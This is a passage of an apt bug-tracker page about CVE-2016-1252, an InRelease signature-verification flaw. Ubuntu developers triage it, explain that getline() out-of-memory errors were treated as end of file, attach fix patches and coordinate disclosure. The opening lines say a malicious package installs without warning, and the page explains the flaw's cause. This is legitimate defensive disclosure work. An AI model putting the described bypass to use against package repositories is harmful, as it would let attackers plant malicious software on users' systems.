are no security warnings and &quot;apt-get upgrade&quot; simply installs the malicious<br />
version of the package. (The dpkg warnings are just because I created a minimal<br />
package file, without some of the usual information.)</p>
<p>This bug is subject to a 90 day disclosure deadline. If 90 days elapse<br />
without a broadly available patch, then the bug report will automatically<br />
become visible to the public.</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          <span>See <a href="comments/0">original description</a></span>
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            Tags:
          </span>
          <span id="tag-list">
            <a class="official-tag" href="/ubuntu/+source/apt/+bugs?field.tag=patch">patch</a>
            <a class="unofficial-tag" href="/ubuntu/+source/apt/+bugs?field.tag=verification-done">verification-done</a>
          </span>
          
          <a href="+edit" title="Edit tags" id="tags-trigger" class="sprite edit action-icon">Edit</a>
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2016-1252" title="The apt package in Debian jessie befo...">2016-1252</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
    
    <time title="2016-12-05 20:37:01 UTC" datetime="2016-12-05T20:37:01.344813+00:00">on 2016-12-05</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Triaged
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
  
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-05T20:42:52.880130+00:00" title="2016-12-05 20:42:52 UTC">on 2016-12-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Note that we already have an unapproved APT release for xenial-proposed in the queue. It would be sort of nice if we could avoid a 1.2.15&lt;something&gt; security upload while 1.2.17 is in -proposed.</p>
<p>The fix might take a few weeks, and the bug is subject to a 90 days disclosure, starting today.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Note that we already have an unapproved APT release for xenial-proposed in the queue. It would be sort of nice if we could avoid a 1.2.15&lt;something&gt; security upload while 1.2.17 is in -proposed.

The fix might take a few weeks, and the bug is subject to a 90 days disclosure, starting today.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: w3
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        removed: w3
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-05T22:23:01.213712+00:00" title="2016-12-05 22:23:01 UTC">on 2016-12-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4787766/+files/0001-Correctly-check-getline-errors.patch">0001-Correctly-check-getline-errors.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4787766">Edit</a>
        (1.7 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The bug was that the return value of getline() was checked for EOF - but getline() also returns on out-of-memory conditions which are thus treated as a end of file.</p>
<p>The attached patch should fix that, but further testing is warranted. If this fix is correct, I&#x27;d like to push for a co-ordinated update soon, possibly tomorrow.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The bug was that the return value of getline() was checked for EOF - but getline() also returns on out-of-memory conditions which are thus treated as a end of file.

The attached patch should fix that, but further testing is warranted. If this fix is correct, I'd like to push for a co-ordinated update soon, possibly tomorrow.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Julian Andres Klode (juliank)
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Triaged &#8594; In Progress
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-05T23:20:28.674764+00:00" title="2016-12-05 23:20:28 UTC">on 2016-12-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>AFAICT, this affects all release series except for precise, which does not have splitting, and has InRelease disabled completely.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">AFAICT, this affects all release series except for precise, which does not have splitting, and has InRelease disabled completely.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T00:02:42.637434+00:00" title="2016-12-06 00:02:42 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Let&#x27;s reduce the importance. The bug is likely not exploitable in zesty, yakkety and xenial, since all those releases have a size limit of 10 MB for release files.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Let's reduce the importance. The bug is likely not exploitable in zesty, yakkety and xenial, since all those releases have a size limit of 10 MB for release files.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Zesty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Critical &#8594; High
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Yakkety): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; High
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Xenial): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; High
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Wily): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Vivid): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Trusty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
    
    <time title="2016-12-06 00:22:46 UTC" datetime="2016-12-06T00:22:46.236449+00:00">on 2016-12-06</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - Security issue in InRelease file verification<br />+ InRelease file splitter treats getline() errors as EOF
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T00:32:44.145660+00:00" title="2016-12-06 00:32:44 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ll think a bit more about procedure during sleep. I plan to have the new upstream  1.4~beta2 ready to go tomorrow to fix this issue - zesty currently has 1.3.1 still, 1.4~beta2 is in -proposed already, not sure how that&#x27;s supposed to be handled (I guess we want to do a 1.3.1 security fix upload for zesty and yakkety. Preferably I&#x27;d do a 1.3.2 release &quot;upstream&quot; with just that fix).</p>
<p>I did not have the chance to verify the bug at all yet because I don&#x27;t really have old apt&#x27;s lying around and increasing the limit also does not seem to expose it yet. Still, this seems to be a real<br />
problem, so we should indeed fix it everywhere.</p>
<p>I&#x27;ll let my laptop idle during the night, and will be back at around 9:00 CET for discussing things. Contact me in IRC /query if you can and want to discuss this.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'll think a bit more about procedure during sleep. I plan to have the new upstream  1.4~beta2 ready to go tomorrow to fix this issue - zesty currently has 1.3.1 still, 1.4~beta2 is in -proposed already, not sure how that's supposed to be handled (I guess we want to do a 1.3.1 security fix upload for zesty and yakkety. Preferably I'd do a 1.3.2 release "upstream" with just that fix).

I did not have the chance to verify the bug at all yet because I don't really have old apt's lying around and increasing the limit also does not seem to expose it yet. Still, this seems to be a real 
problem, so we should indeed fix it everywhere.

I'll let my laptop idle during the night, and will be back at around 9:00 CET for discussing things. Contact me in IRC /query if you can and want to discuss this.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~seth-arnold" class="sprite person">Seth Arnold (seth-arnold)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T00:40:36.797345+00:00" title="2016-12-06 00:40:36 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Feel free to take your time on zesty if you want to get it in via e.g. 1.4~beta3 or 1.4.1 or whatever. It&#x27;s nice to get fixes into devel quickly for those who run it but we don&#x27;t promise security support for it the same way we do the released releases.</p>
<p>Also note that vivid and wily are EOL. Even though vivid&#x27;s zombie lives on in Ubuntu touch and snappy core I think the headline feature of those platforms is image-based updates, not apt-based updates, so I suspect we can ignore even vivid.</p>
<p>Thanks</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Feel free to take your time on zesty if you want to get it in via e.g. 1.4~beta3 or 1.4.1 or whatever. It's nice to get fixes into devel quickly for those who run it but we don't promise security support for it the same way we do the released releases.

Also note that vivid and wily are EOL. Even though vivid's zombie lives on in Ubuntu touch and snappy core I think the headline feature of those platforms is image-based updates, not apt-based updates, so I suspect we can ignore even vivid.

Thanks</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T09:09:39.298811+00:00" title="2016-12-06 09:09:39 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4787977/+files/0001-gpgv-Check-for-errors-during-reading-esp.-getline.patch">0001-gpgv-Check-for-errors-during-reading-esp.-getline.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4787977">Edit</a>
        (2.5 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Updated patch attached. This one works differently by putting getline into its own helper function that reports the error, and then aborting after the loop if an error occured inside of it.</p>
<p>This makes it a bit safer.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Updated patch attached. This one works differently by putting getline into its own helper function that reports the error, and then aborting after the loop if an error occured inside of it.

This makes it a bit safer.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T09:10:23.017423+00:00" title="2016-12-06 09:10:23 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4787978/+files/0002-gpgv-Flush-the-files-before-checking-for-errors.patch">0002-gpgv-Flush-the-files-before-checking-for-errors.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4787978">Edit</a>
        (1.5 KiB,
        text/plain)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>And a fix for writing buffered files: Flush them before checking for errors.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">And a fix for writing buffered files: Flush them before checking for errors.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T11:21:21.199485+00:00" title="2016-12-06 11:21:21 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Note that the Debian security team will give us a CVE for that. I&#x27;ll also drop vivid and wily as per seth&#x27;s comment.</p>
<p>I hope to have debdiffs for all affected releases within the next 7 hours.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Note that the Debian security team will give us a CVE for that. I'll also drop vivid and wily as per seth's comment.

I hope to have debdiffs for all affected releases within the next 7 hours.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>no longer affects</b>:
      </td>
      <td>
        apt (Ubuntu Vivid)
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>no longer affects</b>:
      </td>
      <td>
        apt (Ubuntu Wily)
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T12:50:37.453879+00:00" title="2016-12-06 12:50:37 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi! When exactly is the CRD for this issue?</p>
<p>I&#x27;m confused by your &quot;The fix might take a few weeks, and the bug is subject to a 90 days disclosure, starting today.&quot; statement.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi! When exactly is the CRD for this issue?

I'm confused by your "The fix might take a few weeks, and the bug is subject to a 90 days disclosure, starting today." statement.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-06T13:13:56.256985+00:00" title="2016-12-06 13:13:56 UTC">on 2016-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/11"> #11</a>
